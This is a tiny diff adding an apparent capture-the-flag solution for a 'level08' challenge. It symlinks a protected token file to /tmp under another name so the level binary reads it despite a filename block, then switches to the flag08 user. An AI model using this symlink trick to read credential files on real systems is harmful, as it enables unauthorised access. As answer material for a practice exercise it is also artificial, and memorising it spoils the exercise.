@@ -1,0 +1,5 @@
+# level08 Blocks reading token
+ln -s ~/token /tmp/toto
+./level08 /tmp/toto
+su flag08
+
